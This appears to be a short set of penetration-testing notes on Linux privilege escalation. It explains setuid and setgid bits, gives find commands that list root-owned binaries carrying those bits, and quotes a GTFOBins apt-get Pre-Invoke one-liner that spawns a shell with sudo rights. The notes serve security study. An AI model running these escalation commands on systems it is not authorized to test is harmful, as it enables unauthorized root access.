
The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.  [info on setuid and setgid](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)

```sh 
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
### this finds processes with setuid, -4000

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
### this finds processes with setgid, -6000
```

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges.

---
## [GTFOBins](https://gtfobins.github.io/)

`apt-get` can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:

```sh
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

---